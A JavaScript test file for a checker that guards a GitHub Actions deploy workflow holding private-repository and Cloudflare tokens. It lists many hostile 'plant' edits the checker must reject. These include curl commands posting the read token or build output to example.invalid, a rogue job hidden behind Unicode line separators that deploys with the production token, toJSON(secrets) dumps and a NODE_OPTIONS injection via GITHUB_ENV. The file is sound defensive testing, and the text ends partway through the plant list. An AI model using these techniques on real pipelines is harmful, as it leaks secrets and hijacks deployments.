import { strict as assert } from 'node:assert';
import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, unlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { after, describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';
import {
    ACTIONS,
    CI_RULES,
    HOOK_RULES,
    NPM_REGISTRY,
    PINNED_USES,
    PNPM_PACKAGE_MANAGER,
    PNPM_PACKAGE_MANAGER_SHA512,
    PRODUCTION_RELEASE_SENTENCE,
    PUBLIC_CHECK_TESTS,
    PUBLIC_CHECKS_RUN,
    RULES,
    SKIPS,
    UNWRAP_RUN,
    WORKFLOW_FILES,
    WRANGLER_RULES,
    ciProblems,
    parseWorkflow,
    pnpmHookProblems,
    trackedPathsAt,
    usesOf,
    workflowFilesAt,
    workflowFilesProblems,
    workflowProblems,
    wranglerProblems,
} from './deploy-workflow-lib.mjs';
import { PACK_SCRIPT, PIN_SCRIPT } from './looks-artifact.mjs';
import { CANARY_TREE, publicLookFacts } from './private-looks.mjs';

/**
 * `.github/workflows/deploy.yml` holds three kinds of key — the private
 * repository's read token, the preview deploy token and the production
 * deploy token — so its shape is a rule and not a style (step 8c3;
 * STEP-8C-PLAN v2, V1 and V5). The grammar and the rules are
 * `scripts/deploy-workflow-lib.mjs`'s; here, the real file breaks none, and
 * **every rule and every refused shape carries a committed plant** — an
 * edit of the real text that must yield that rule's own problem — so a rule
 * silently weakened turns its own plant green and this suite red.
 *
 * `public-checks`, the workflow's first job (no secret, no Environment),
 * runs this file before the `looks` job reads a private byte, beside the
 * pin's and the pack's tests: the copy of each shell script in the YAML is
 * held to its module here (`the-workflow-runs-the-scripts-it-was-tested-with`),
 * and the module's `CANARY_TREE` to this repository's bytes there (the
 * third 8c2 critic's item 1). Node built-ins and git only: nothing is
 * installed where it runs.
 */

const ROOT = dirname(dirname(fileURLToPath(import.meta.url)));
const TEXT = readFileSync(join(ROOT, '.github', 'workflows', 'deploy.yml'), 'utf8');
const SOURCES = Object.fromEntries(Object.keys(PUBLIC_CHECK_TESTS).map((path) => [path, readFileSync(join(ROOT, path), 'utf8')]));
const FACTS = await publicLookFacts();
const problemsOf = (text, over = {}) => workflowProblems(text, { released: FACTS.released, sources: SOURCES, ...over });

const ex = (inner) => '${{ ' + inner + ' }}';
const CHECKOUT = usesOf(ACTIONS.checkout);
const SETUP_NODE = usesOf(ACTIONS.setupNode);
const UPLOAD = usesOf(ACTIONS.upload);
const DOWNLOAD = usesOf(ACTIONS.download);
const PREVIEW_GATE = "    if: github.ref == 'refs/heads/main' && inputs.target == 'preview'\n";
const PRODUCTION_GATE = "    if: github.ref == 'refs/heads/main' && inputs.target == 'production'\n";
const RUN_TESTS = '      - run: pnpm test\n';
const INSTALL_STEP = '      - run: pnpm install --frozen-lockfile --ignore-pnpmfile\n';
const INSTALL_DEPLOY_STEP = '      - run: pnpm install --frozen-lockfile --ignore-scripts --ignore-pnpmfile\n';
/** The characters a YAML reader takes for a line break that a split on `\n` does not (the 8c3 critic's item 1), and a C1 control. */
const LS = '\u2028';
const PS = '\u2029';
const NEL = '\u0085';
const CSI = '\u009b';
/** The word a skipped test is written with, put together so this file holds none of the shapes `SKIPS` refuses. */
const SKIP = ['sk', 'ip'].join('');
const UNWRAP_STEP = `      - run: ${UNWRAP_RUN}\n`;
const PRIVATE_FETCH = '          fetch-depth: 1\n';

/** `text` with `from`, which stands in it exactly once, replaced by `to`: a plant whose anchor moved is a plant that plants nothing. */
function once(text, from, to) {
    const at = text.indexOf(from);
    assert.ok(at >= 0, `the plant's anchor is in the file: ${JSON.stringify(from.slice(0, 80))}`);
    assert.equal(text.indexOf(from, at + 1), -1, `the plant's anchor is in the file once: ${JSON.stringify(from.slice(0, 80))}`);
    return text.slice(0, at) + to + text.slice(at + from.length);
}

/** An edit of one job's text alone, from its header to the next job's. */
function inJob(name, change) {
    return (text) => {
        const start = text.indexOf(`\n  ${name}:\n`);
        assert.ok(start >= 0, `the job ${name} is in the file`);
        const next = text.slice(start + 2).search(/\n {2}[a-z][a-z-]*:\n/);
        const end = next < 0 ? text.length : start + 2 + next + 1;
        return text.slice(0, start + 1) + change(text.slice(start + 1, end)) + text.slice(end);
    };
}

const pipe =
    (...edits) =>
    (text) =>
        edits.reduce((acc, edit) => edit(acc), text);
const edit = (from, to) => (text) => once(text, from, to);
const inJobEdit = (name, from, to) => inJob(name, (text) => once(text, from, to));

/** Each plant: what it is, the rule whose own problem it must yield, the edit, and the facts it is read with. */
const PLANTS = [
    // The closed grammar: a shape a YAML reader would read otherwise is refused before any rule.
    [
        'the 8c critic’s plant: a double-quoted run: with \\u escapes that a YAML parser reads as a production deploy',
        'grammar',
        inJobEdit(
            'deploy-preview',
            '      - name: Deploy dist to the preview-direct branch\n',
            '      - name: Tidy\n        run: "deploy/node_modules/.bin/wrangler pages deploy dist --project-name stall --branch \\u006dain"\n      - name: Deploy dist to the preview-direct branch\n',
        ),
    ],
    ['a single-quoted value that quotes a quote', 'grammar', inJobEdit('deploy-preview', "WRANGLER_SEND_METRICS: 'false'", "WRANGLER_SEND_METRICS: 'fal''se'")],
    [
        'an anchor-and-alias env: copied into the production deploy',
        'grammar',
        pipe(
            inJobEdit('deploy-preview', '        env:\n          CLOUDFLARE_API_TOKEN', '        env: &cf\n          CLOUDFLARE_API_TOKEN'),
            inJobEdit(
                'deploy-production',
                `        env:\n          CLOUDFLARE_API_TOKEN: ${ex('secrets.CLOUDFLARE_API_TOKEN')}\n          CLOUDFLARE_ACCOUNT_ID: ${ex('secrets.CLOUDFLARE_ACCOUNT_ID')}\n          WRANGLER_SEND_METRICS: 'false'\n`,
                '        env: *cf\n',
            ),
        ),
    ],
    ['a merge key', 'grammar', inJobEdit('deploy-production', '        env:\n', '        env:\n          <<: *cf\n')],
    ['a job written as a flow mapping', 'grammar', (text) => `${text}  tidy: {runs-on: ubuntu-latest, environment: cloudflare, steps: [{run: deploy/node_modules/.bin/wrangler pages deploy dist}]}\n`],
    ['options: as a flow sequence', 'grammar', edit('        options:\n          - preview\n          - production\n', '        options: [preview, production]\n')],
    ['a quoted "environment" key', 'grammar', inJobEdit('build-production', '    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    "environment": production\n')],
    ['a plain scalar continued: pnpm test, then && … on the next line', 'grammar', inJobEdit('build-preview', RUN_TESTS, `${RUN_TESTS}          && curl --data-binary @dist/index.html https://example.invalid\n`)],
    ['a duplicate environment: key', 'grammar', inJobEdit('deploy-preview', '    environment: cloudflare\n', '    environment: cloudflare\n    environment: production\n')],
    ['a folded run: >', 'grammar', inJobEdit('deploy-production', '        run: |\n', '        run: >\n')],
    ['a run: |- that strips its last newline', 'grammar', inJobEdit('deploy-preview', '        run: |\n', '        run: |-\n')],
    ['a tag', 'grammar', inJobEdit('public-checks', '          persist-credentials: false\n', '          persist-credentials: !!bool false\n')],
    ['a tab', 'grammar', inJobEdit('build-production', '    runs-on: ubuntu-latest\n', '    runs-on:\tubuntu-latest\n')],
    [
        'the 8c3 critic’s edit (a): a step reading the read token, hidden after a U+2028 in a comment of the looks job',
        'grammar',
        inJobEdit(
            'looks',
            '      # One commit, no history, no credential left behind. The checkout\n',
            `      # One commit, no history, no credential left behind. The checkout${LS}      - env:${LS}          T: ${ex('secrets.LOOKS_READ_TOKEN')}${LS}        run: curl -sd "$T" https://example.invalid\n`,
        ),
    ],
    [
        'the 8c3 critic’s edit (b): a seventh job deploying to main with the preview token, hidden after a U+0085 in a comment',
        'grammar',
        edit(
            "  # Waits for the owner's review in the `production` Environment. Approve\n",
            `  # Waits for the owner's review in the \`production\` Environment. Approve${NEL}  sneak:${NEL}    needs: build-production${NEL}    runs-on: ubuntu-latest${NEL}    environment: cloudflare${NEL}    steps:${NEL}      - uses: actions/checkout@v5${NEL}      - env:${NEL}          CLOUDFLARE_API_TOKEN: ${ex('secrets.CLOUDFLARE_API_TOKEN')}${NEL}        run: npx wrangler pages deploy . --branch main\n`,
        ),
    ],
    ['a U+2029 in a comment', 'grammar', inJobEdit('public-checks', "      # The whole history: the canary's recipe reads its bytes at the\n", `      # The whole history: the canary's recipe reads its bytes at the${PS}\n`)],
    ['a U+2028 alone in a comment', 'grammar', edit('# Six jobs, three Environments,', `# Six jobs,${LS} three Environments,`)],
    ['a U+0085 alone in a comment', 'grammar', edit('# Six jobs, three Environments,', `# Six jobs,${NEL} three Environments,`)],
    ['a C1 control in a comment', 'grammar', edit('# Six jobs, three Environments,', `# Six jobs,${CSI} three Environments,`)],
    ['a non-ASCII character in a comment', 'grammar', edit('# Six jobs, three Environments,', '# Six jobs \u2014 three Environments,')],
    ['a comment after a run: value', 'grammar', inJobEdit('build-preview', RUN_TESTS, '      - run: pnpm test # || true\n')],
    ['a document marker', 'grammar', (text) => `---\n${text}`],
    ['a zero-width space in a value', 'grammar', inJobEdit('deploy-preview', '    environment: cloudflare\n', '    environment: cloud\u200bflare\n')],
    [
        'a blank line inside a run block, and the line after it',
        'grammar',
        inJobEdit('deploy-production', '> /dev/null\n          deploy/node_modules/.bin/wrangler pages deploy', '> /dev/null\n\n          deploy/node_modules/.bin/wrangler pages deploy'),
    ],
    ['a step at its job’s own indentation', 'grammar', inJobEdit('public-checks', `      - run: ${PUBLIC_CHECKS_RUN}\n`, `    - run: ${PUBLIC_CHECKS_RUN}\n`)],
    ['a CRLF line ending', 'grammar', inJobEdit('build-production', '    timeout-minutes: 30\n', '    timeout-minutes: 30\r\n')],
    ['a key with nothing under it', 'grammar', inJobEdit('looks', '    needs: public-checks\n', '    needs:\n')],
    ['a block scalar outside run:', 'grammar', (text) => text.replace(/\n {8}description: [^\n]*\n/, '\n        description: |\n          preview or production\n')],
    ['a key and its value with no space between', 'grammar', inJobEdit('build-production', '    runs-on: ubuntu-latest\n', '    runs-on:ubuntu-latest\n')],
    ['a file with no last newline', 'grammar', (text) => text.slice(0, -1)],
    [
        'a run block with no line in it',
        'grammar',
        inJobEdit(
            'deploy-preview',
            '        run: |\n          deploy/node_modules/.bin/wrangler pages deployment list --project-name stall > /dev/null\n          deploy/node_modules/.bin/wrangler pages deploy dist --project-name stall --branch preview-direct --commit-hash "$GITHUB_SHA" --commit-dirty=false\n',
            '        run: |\n',
        ),
    ],
    ['a backslash in a plain value', 'grammar', inJobEdit('build-production', '      - run: pnpm build\n', '      - run: echo \\u006d\n')],
    ['a flow indicator inside a plain value', 'grammar', inJobEdit('build-production', '      - run: pnpm build\n', '      - run: echo {a,b}\n')],
    ['a colon and a space inside a value', 'grammar', inJobEdit('build-production', '      - run: pnpm build\n', '      - run: echo a: b\n')],
    ['a non-ASCII character in a run block', 'grammar', inJobEdit('deploy-production', '> /dev/null\n', '> /dev/null \u00e9\n')],
    ['trailing spaces in a run block', 'grammar', inJobEdit('deploy-preview', '--commit-dirty=false\n', '--commit-dirty=false \n')],
    ['trailing spaces after a value', 'grammar', inJobEdit('build-production', '    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest \n')],
    ['an option that is not a list item', 'grammar', edit('          - production\n', '          production\n')],
    ['a step that is a plain scalar', 'grammar', inJobEdit('public-checks', `      - run: ${PUBLIC_CHECKS_RUN}\n`, `      - run: ${PUBLIC_CHECKS_RUN}\n      - pnpm test\n`)],
    ['a last key with nothing under it', 'grammar', (text) => `${text}  extra:\n`],

    // top
    ['a top-level env: (NODE_OPTIONS reaches every step, wrangler’s included)', 'top', edit('\njobs:\n', "\nenv:\n  NODE_OPTIONS: '--max-old-space-size'\n\njobs:\n")],
    ['a top-level defaults:', 'top', edit('\njobs:\n', '\ndefaults:\n  run:\n    shell: sh\n\njobs:\n')],
    ['another name', 'top', edit('\nname: deploy\n', '\nname: release\n')],
    ['a run-name:', 'top', edit('\nname: deploy\n', '\nname: deploy\nrun-name: deploy\n')],

    // triggers
    ['production by default', 'triggers', edit('        default: preview\n', '        default: production\n')],
    ['a third target', 'triggers', edit('          - production\n', '          - production\n          - staging\n')],
    ['a ref input (a commit to deploy)', 'triggers', edit('        default: preview\n', '        default: preview\n      ref:\n        description: a commit to deploy\n        type: string\n')],
    ['a push trigger', 'triggers', edit('on:\n  workflow_dispatch:\n', 'on:\n  push:\n    branches-ignore: dev\n  workflow_dispatch:\n')],
    ['a pull_request trigger', 'triggers', edit('on:\n  workflow_dispatch:\n', 'on:\n  pull_request:\n    types: opened\n  workflow_dispatch:\n')],
    ['a workflow_call trigger', 'triggers', edit('        default: preview\n', '        default: preview\n  workflow_call:\n    inputs:\n      target:\n        type: string\n')],

    // jobs
    ['a seventh job', 'jobs', (text) => `${text}\n  extra:\n${PREVIEW_GATE}    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    steps:\n      - run: pnpm test\n`],
    ['a job renamed', 'jobs', pipe(edit('\n  build-production:\n', '\n  build-public:\n'), edit('    needs: build-production\n', '    needs: build-public\n'))],

    // job-keys
    ['a container: on build-preview', 'job-keys', inJobEdit('build-preview', '    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    container: node:22\n')],
    ['services: on build-production', 'job-keys', inJobEdit('build-production', '    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    services:\n      cache:\n        image: redis\n')],
    ['a strategy: on build-preview', 'job-keys', inJobEdit('build-preview', '    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    strategy:\n      fail-fast: false\n')],
    ['continue-on-error: on a job', 'job-keys', inJobEdit('build-production', '    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    continue-on-error: true\n')],
    ['outputs: on the looks job', 'job-keys', inJobEdit('looks', '    runs-on: ubuntu-latest\n', `    runs-on: ubuntu-latest\n    outputs:\n      commit: ${ex('steps.pin.outputs.commit')}\n`)],
    ['defaults: on the looks job', 'job-keys', inJobEdit('looks', '    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: looks\n')],
    ['a job that calls another workflow', 'job-keys', inJobEdit('deploy-production', '    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    uses: ./.github/workflows/other.yml\n')],

    // if
    ['the main gate dropped from deploy-production', 'if', inJobEdit('deploy-production', PRODUCTION_GATE, "    if: inputs.target == 'production'\n")],
    ['deploy-preview gated on production', 'if', inJobEdit('deploy-preview', PREVIEW_GATE, PRODUCTION_GATE)],
    ['|| always() on a deploy if:', 'if', inJobEdit('deploy-production', PRODUCTION_GATE, `${PRODUCTION_GATE.slice(0, -1)} || always()\n`)],
    ['if: true on build-production', 'if', inJobEdit('build-production', PRODUCTION_GATE, '    if: true\n')],

    // needs
    ['deploy-production after build-preview', 'needs', inJobEdit('deploy-production', '    needs: build-production\n', '    needs: build-preview\n')],
    ['build-production after looks', 'needs', inJobEdit('build-production', PRODUCTION_GATE, `    needs: looks\n${PRODUCTION_GATE}`)],
    ['deploy-preview after build-production', 'needs', inJobEdit('deploy-preview', '    needs: build-preview\n', '    needs: build-production\n')],
    ['the looks job no longer waiting for public-checks', 'needs', inJobEdit('looks', '    needs: public-checks\n', '')],

    // environment
    ['the cloudflare Environment on the production deploy', 'environment', inJobEdit('deploy-production', '    environment: production\n', '    environment: cloudflare\n')],
    ['an Environment on build-preview', 'environment', inJobEdit('build-preview', '    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    environment: cloudflare\n')],
    ['an Environment on public-checks', 'environment', inJobEdit('public-checks', '    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    environment: looks\n')],
    ['the looks job without its Environment (its secrets would be the repository’s)', 'environment', inJobEdit('looks', '    environment: looks\n', '')],

    // runs-on, timeout
    ['a self-hosted runner for the looks job', 'runs-on', inJobEdit('looks', '    runs-on: ubuntu-latest\n', '    runs-on: self-hosted\n')],
    ['the looks job’s timeout raised', 'timeout', inJobEdit('looks', '    timeout-minutes: 10\n', '    timeout-minutes: 600\n')],

    // steps
    ['pnpm test dropped from build-production', 'steps', inJobEdit('build-production', RUN_TESTS, '')],
    ['pnpm build with another mode', 'steps', inJobEdit('build-production', '      - run: pnpm build\n', '      - run: pnpm build --mode development\n')],
    ['build-preview tests before it builds', 'steps', inJobEdit('build-preview', `      - run: pnpm build\n${RUN_TESTS}`, `${RUN_TESTS}      - run: pnpm build\n`)],

    // step-keys
    ['continue-on-error: on pnpm test', 'step-keys', inJobEdit('build-preview', RUN_TESTS, `${RUN_TESTS}        continue-on-error: true\n`)],
    ['working-directory: on a run step', 'step-keys', inJobEdit('build-preview', '      - run: pnpm build\n', '      - run: pnpm build\n        working-directory: looks\n')],
    [
        'a step-level if: on the deploy step',
        'step-keys',
        inJobEdit('deploy-preview', '      - name: Deploy dist to the preview-direct branch\n', "      - name: Deploy dist to the preview-direct branch\n        if: inputs.target == 'preview'\n"),
    ],
    ['timeout-minutes: on a step', 'step-keys', inJobEdit('build-production', RUN_TESTS, `${RUN_TESTS}        timeout-minutes: 1\n`)],
    ['a step that both uses and runs', 'step-keys', inJobEdit('public-checks', `      - uses: ${SETUP_NODE}\n`, `      - uses: ${SETUP_NODE}\n        run: pnpm test\n`)],

    // functions
    ['&& !cancelled() on a deploy if:', 'functions', inJobEdit('deploy-production', PRODUCTION_GATE, `${PRODUCTION_GATE.slice(0, -1)} && !cancelled()\n`)],
    ['toJSON(github) in a deploy step’s env', 'functions', inJobEdit('deploy-preview', "          WRANGLER_SEND_METRICS: 'false'\n", `          WRANGLER_SEND_METRICS: 'false'\n          CONTEXT: ${ex('toJSON(github)')}\n`)],
    ['a step that runs on failure()', 'functions', inJobEdit('build-production', RUN_TESTS, `${RUN_TESTS}      - if: failure()\n        run: pnpm test\n`)],

    // expressions
    ['inputs.target in a step’s env', 'expressions', inJobEdit('public-checks', `      - run: ${PUBLIC_CHECKS_RUN}\n`, `      - run: ${PUBLIC_CHECKS_RUN}\n        env:\n          TARGET: ${ex('inputs.target')}\n`)],
    ['a variable as the private repository', 'expressions', inJobEdit('looks', `          repository: ${ex('secrets.LOOKS_REPO')}\n`, `          repository: ${ex('vars.LOOKS_REPO')}\n`)],
    ['an expression written without its spaces', 'expressions', inJobEdit('looks', `          repository: ${ex('secrets.LOOKS_REPO')}\n`, '          repository: ${{secrets.LOOKS_REPO}}\n')],

    // secrets
    ['the read token in build-preview’s env', 'secrets', inJobEdit('build-preview', "      STALL_LOOKS_REQUIRED: '1'\n", `      STALL_LOOKS_REQUIRED: '1'\n      LOOKS_TOKEN: ${ex('secrets.LOOKS_READ_TOKEN')}\n`)],
    ['toJSON(secrets) in a deploy step', 'secrets', inJobEdit('deploy-preview', "          WRANGLER_SEND_METRICS: 'false'\n", `          WRANGLER_SEND_METRICS: 'false'\n          ALL: ${ex('toJSON(secrets)')}\n`)],
    ['secrets: inherit on build-preview', 'secrets', inJobEdit('build-preview', '    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    secrets: inherit\n')],
    [
        'a Cloudflare secret in the looks job',
        'secrets',
        inJobEdit('looks', `          PINNED_TREE: ${ex('steps.pin.outputs.tree')}\n`, `          PINNED_TREE: ${ex('steps.pin.outputs.tree')}\n          CLOUDFLARE_API_TOKEN: ${ex('secrets.CLOUDFLARE_API_TOKEN')}\n`),
    ],
    ['GITHUB_TOKEN handed to a checkout', 'secrets', inJobEdit('build-production', '          persist-credentials: false\n', `          persist-credentials: false\n          token: ${ex('secrets.GITHUB_TOKEN')}\n`)],
    ['the read token in the preview deploy step', 'secrets', inJobEdit('deploy-preview', "          WRANGLER_SEND_METRICS: 'false'\n", `          WRANGLER_SEND_METRICS: 'false'\n          LOOKS_READ_TOKEN: ${ex('secrets.LOOKS_READ_TOKEN')}\n`)],

    // shell
    ['an expression inside a run:', 'shell', inJobEdit('public-checks', `      - run: ${PUBLIC_CHECKS_RUN}\n`, `      - run: ${PUBLIC_CHECKS_RUN}\n      - run: echo ${ex('inputs.target')}\n`)],
    ['a GITHUB_ENV write in build-preview', 'shell', inJobEdit('build-preview', UNWRAP_STEP, `${UNWRAP_STEP}      - run: echo NODE_OPTIONS=--require=./x.cjs >> "$GITHUB_ENV"\n`)],
    ['a GITHUB_PATH write', 'shell', inJobEdit('build-production', RUN_TESTS, `${RUN_TESTS}      - run: echo ./bin >> "$GITHUB_PATH"\n`)],
    ['a second GITHUB_OUTPUT write', 'shell', inJobEdit('build-production', RUN_TESTS, `${RUN_TESTS}      - run: echo x=y >> "$GITHUB_OUTPUT"\n`)],
    ['the pack step without shell: bash', 'shell', inJobEdit('looks', '      - name: Pack the pinned tree\n        shell: bash\n', '      - name: Pack the pinned tree\n')],
    ['shell: sh on the pin step', 'shell', inJobEdit('looks', '        name: Read the pin\n        shell: bash\n', '        name: Read the pin\n        shell: sh\n')],
    ['shell: bash on the production deploy step', 'shell', inJobEdit('deploy-production', '      - name: Deploy dist to production\n', '      - name: Deploy dist to production\n        shell: bash\n')],

    // looks-job
    ['a node script in the looks job', 'looks-job', inJobEdit('looks', `      - uses: ${UPLOAD}\n`, `      - run: node scripts/x.mjs\n      - uses: ${UPLOAD}\n`)],
    ['setup-node in the looks job', 'looks-job', inJobEdit('looks', `      - id: pin\n`, `      - uses: ${SETUP_NODE}\n        with:\n          node-version-file: .nvmrc\n      - id: pin\n`)],
    ['npx in the looks job', 'looks-job', inJobEdit('looks', `      - uses: ${UPLOAD}\n`, `      - run: npx some-tool\n      - uses: ${UPLOAD}\n`)],
    ['corepack in the looks job', 'looks-job', inJobEdit('looks', `      - uses: ${UPLOAD}\n`, `      - run: corepack enable\n      - uses: ${UPLOAD}\n`)],

    // verbatim
    [
        'the pack’s CANARY_TREE edited in the YAML alone (the third 8c2 critic’s road)',
        'verbatim',
        inJobEdit('looks', `"${CANARY_TREE}"`, `"${CANARY_TREE.slice(0, -1)}${CANARY_TREE.endsWith('0') ? '1' : '0'}"`),
    ],
    ['the pin step without set -euo pipefail', 'verbatim', inJobEdit('looks', '        run: |\n          set -euo pipefail\n          pin=deploy/looks.commit\n', '        run: |\n          pin=deploy/looks.commit\n')],
    [
        'the allow-list’s refusal dropped from the pack',
        'verbatim',
        inJobEdit('looks', '          [ "$refused" = 0 ] || { echo "$refused entries of the pinned tree are not files this road carries (their names are not printed in a public log)" >&2; exit 1; }\n', ''),
    ],

    // private-checkout
    ['the private checkout at main', 'private-checkout', inJobEdit('looks', `          ref: ${ex('steps.pin.outputs.commit')}\n`, '          ref: main\n')],
    ['the private checkout with its history', 'private-checkout', inJobEdit('looks', PRIVATE_FETCH, '          fetch-depth: 0\n')],
    ['the private checkout with submodules', 'private-checkout', inJobEdit('looks', PRIVATE_FETCH, `${PRIVATE_FETCH}          submodules: true\n`)],
    ['a literal private repository', 'private-checkout', inJobEdit('looks', `          repository: ${ex('secrets.LOOKS_REPO')}\n`, '          repository: someone/looks\n')],
    ['repository: on build-preview’s checkout', 'private-checkout', inJobEdit('build-preview', '          fetch-depth: 0\n', '          fetch-depth: 0\n          repository: someone/stall\n')],
    ['repository: on a download (another repository’s artifact)', 'private-checkout', inJobEdit('deploy-production', '          name: dist-production\n          path: dist\n', '          name: dist-production\n          path: dist\n          repository: someone/stall\n')],
    ['a public checkout two commits deep', 'private-checkout', inJobEdit('deploy-preview', '          persist-credentials: false\n', '          persist-credentials: false\n          fetch-depth: 2\n')],

    // selection
    ['STALL_LOOKS_TARGET on the test step', 'selection', inJobEdit('build-preview', RUN_TESTS, `${RUN_TESTS}        env:\n          STALL_LOOKS_TARGET: preview\n`)],
    ['STALL_LOOKS_REQUIRED dropped', 'selection', inJobEdit('build-preview', "      STALL_LOOKS_REQUIRED: '1'\n", '')],
    ['STALL_LOOKS_COMMIT added', 'selection', inJobEdit('build-preview', "      STALL_LOOKS_REQUIRED: '1'\n", "      STALL_LOOKS_REQUIRED: '1'\n      STALL_LOOKS_COMMIT: main\n")],
    ['the production target selected on build-preview', 'selection', inJobEdit('build-preview', '      STALL_LOOKS_TARGET: preview\n', '      STALL_LOOKS_TARGET: production\n')],
    ['STALL_LOOKS_DIR on public-checks', 'selection', inJobEdit('public-checks', `      - run: ${PUBLIC_CHECKS_RUN}\n`, `      - run: ${PUBLIC_CHECKS_RUN}\n        env:\n          STALL_LOOKS_DIR: looks\n`)],

    // unwrap-first
    ['the unwrap after the install', 'unwrap-first', pipe(inJobEdit('build-preview', UNWRAP_STEP, ''), inJobEdit('build-preview', INSTALL_STEP, `${INSTALL_STEP}${UNWRAP_STEP}`))],
    ['the unwrap before the download', 'unwrap-first', pipe(inJobEdit('build-preview', UNWRAP_STEP, ''), inJobEdit('build-preview', `      - uses: ${DOWNLOAD}\n`, `${UNWRAP_STEP}      - uses: ${DOWNLOAD}\n`))],
    ['no unwrap', 'unwrap-first', inJobEdit('build-preview', UNWRAP_STEP, '')],
    ['an unwrap in build-production', 'unwrap-first', inJobEdit('build-production', '      - run: corepack enable && corepack prepare --activate\n', `${UNWRAP_STEP}      - run: corepack enable && corepack prepare --activate\n`)],

    // production-carries-nothing
    ['RELEASED_LOOK_IDS naming an id', 'production-carries-nothing', (text) => text, { released: [0x04] }],
    ['a selection on build-production', 'production-carries-nothing', inJobEdit('build-production', '    timeout-minutes: 30\n', '    timeout-minutes: 30\n    env:\n      STALL_LOOKS_TARGET: production\n')],
    [
        'build-production downloading the looks artifact',
        'production-carries-nothing',
        inJobEdit('build-production', '      - run: corepack enable && corepack prepare --activate\n', `      - uses: ${DOWNLOAD}\n        with:\n          name: looks\n          path: looks\n      - run: corepack enable && corepack prepare --activate\n`),
    ],
    ['deploy-production downloading the looks artifact', 'production-carries-nothing', inJobEdit('deploy-production', '          name: dist-production\n', '          name: looks\n')],
    ['an Environment on build-production', 'production-carries-nothing', inJobEdit('build-production', '    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    environment: production\n')],
    ['STALL_LOOKS_DIR in the production deploy step', 'production-carries-nothing', inJobEdit('deploy-production', "          WRANGLER_SEND_METRICS: 'false'\n", "          WRANGLER_SEND_METRICS: 'false'\n          STALL_LOOKS_DIR: dist\n")],
    ['a nameless download in deploy-production (every artifact of the run, looks among them)', 'production-carries-nothing', inJobEdit('deploy-production', '          name: dist-production\n          path: dist\n', '          path: dist\n')],
    ['build-production after looks', 'production-carries-nothing', inJobEdit('build-production', PRODUCTION_GATE, `    needs: looks\n${PRODUCTION_GATE}`)],

    // deploy
    ['--branch=main appended to the preview call', 'deploy', inJobEdit('deploy-preview', '--commit-dirty=false\n', '--commit-dirty=false --branch=main\n')],
    ['a second deploy call in the preview job', 'deploy', inJobEdit('deploy-preview', '--commit-dirty=false\n', '--commit-dirty=false\n          deploy/node_modules/.bin/wrangler pages deploy dist --project-name stall\n')],
    ['the preview job deploying to main', 'deploy', inJobEdit('deploy-preview', '--branch preview-direct ', '--branch main ')],
    ['the production call without --branch', 'deploy', inJobEdit('deploy-production', '--branch main ', '')],
    ['pnpm build in the production deploy', 'deploy', inJobEdit('deploy-production', '      - run: npm ci --prefix deploy --ignore-scripts --no-audit --no-fund\n', '      - run: npm ci --prefix deploy --ignore-scripts --no-audit --no-fund\n      - run: pnpm build\n')],
    ['wrangler in build-production', 'deploy', inJobEdit('build-production', RUN_TESTS, `${RUN_TESTS}      - run: pnpm exec wrangler --version\n`)],

    // installs
    ['the preview deploy’s install loading pnpm’s hook', 'installs', inJobEdit('deploy-preview', INSTALL_DEPLOY_STEP, '      - run: pnpm install --frozen-lockfile --ignore-scripts\n')],
    ['the production deploy’s npm ci running package scripts', 'installs', inJobEdit('deploy-production', '      - run: npm ci --prefix deploy --ignore-scripts --no-audit --no-fund\n', '      - run: npm ci --prefix deploy --no-audit --no-fund\n')],
    ['the production deploy’s pnpm install running package scripts', 'installs', inJobEdit('deploy-production', INSTALL_DEPLOY_STEP, '      - run: pnpm install --frozen-lockfile --ignore-pnpmfile\n')],
    ['build-production’s install loading pnpm’s hook', 'installs', inJobEdit('build-production', INSTALL_STEP, '      - run: pnpm install --frozen-lockfile\n')],
    ['a pnpm call in a deploy job that would load the hook', 'installs', inJobEdit('deploy-preview', INSTALL_DEPLOY_STEP, `${INSTALL_DEPLOY_STEP}      - run: pnpm --version --ignore-scripts\n`)],

    // credentials
    ['a checkout that keeps its credential', 'credentials', inJobEdit('deploy-preview', `      - uses: ${CHECKOUT}\n        with:\n          persist-credentials: false\n`, `      - uses: ${CHECKOUT}\n`)],
    ['permissions: write-all on build-preview', 'credentials', inJobEdit('build-preview', '    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    permissions: write-all\n')],
    ['contents: write', 'credentials', edit('permissions:\n  contents: read\n', 'permissions:\n  contents: write\n')],
    ['actions: write', 'credentials', edit('permissions:\n  contents: read\n', 'permissions:\n  contents: read\n  actions: write\n')],
    ['the private checkout keeping its credential', 'credentials', inJobEdit('looks', `          persist-credentials: false\n${PRIVATE_FETCH}`, `          persist-credentials: true\n${PRIVATE_FETCH}`)],

    // artifacts
    ['the looks artifact kept a week', 'artifacts', inJobEdit('looks', '          retention-days: 1\n', '          retention-days: 7\n')],
    ['the looks upload taking the clone', 'artifacts', inJobEdit('looks', `          path: ${ex('runner.temp')}/looks-artifact\n`, '          path: looks\n')],
    ['a download with no name (every artifact of the run)', 'artifacts', inJobEdit('deploy-preview', '          name: dist-preview\n          path: dist\n', '          path: dist\n')],
    ['an empty dist uploaded with a warning', 'artifacts', inJobEdit('build-production', '          if-no-files-found: error\n', '          if-no-files-found: warn\n')],
    ['a download from another run', 'artifacts', inJobEdit('deploy-production', '          name: dist-production\n          path: dist\n', "          name: dist-production\n          path: dist\n          run-id: '1'\n")],
    ['the preview dist without its hidden files', 'artifacts', inJobEdit('build-preview', '          include-hidden-files: true\n', '')],
